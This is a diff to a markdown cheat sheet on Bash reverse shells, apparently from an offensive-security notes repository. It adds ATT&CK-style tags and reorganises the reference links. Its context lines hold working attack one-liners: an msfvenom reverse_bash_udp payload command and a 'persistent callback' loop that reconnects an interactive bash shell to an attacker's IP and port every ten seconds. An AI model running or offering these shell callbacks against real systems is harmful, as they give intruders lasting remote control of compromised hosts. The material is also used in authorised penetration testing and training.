@@ -1,3 +1,12 @@
+---
+author(s):
+  - Userware
+tags:
+  - initial-access
+  - weaponization
+  - T1059-004
+  - linux
+---
 # Bash
 
 ## 01 - TCP Method
@@ -56,7 +65,7 @@ $ msfvenom -p cmd/unix/reverse_bash_udp lhost=<IP> lport=<PORT>
 
 ## 04 - Persistent Callback Shell
 
-- In case you might lose the callback connection. It's better to make it persistent.
+In case you might lose the callback connection. It's better to make it persistent.
 
 ```
 $ while true; do /bin/bash -c /path/to/shell; sleep 10; done
@@ -67,6 +76,14 @@ $ while true; do /bin/bash -i >& /dev/<protocol>/<IP>/<LPORT> 0>&1; sleep 10;
 ---
 ## References
 
+### Hacktricks
+
 - [Hacktricks: Shells Linux](https://book.hacktricks.xyz/shells/shells/linux)
 
+### Github
+
 - [D4Vinci: One-Lin3r](https://github.com/D4Vinci/One-Lin3r)
+
+### MITRE
+
+- [MITRE T1059.004: Command and Scripting Interpreter - Unix Shell](https://attack.mitre.org/techniques/T1059/004/)
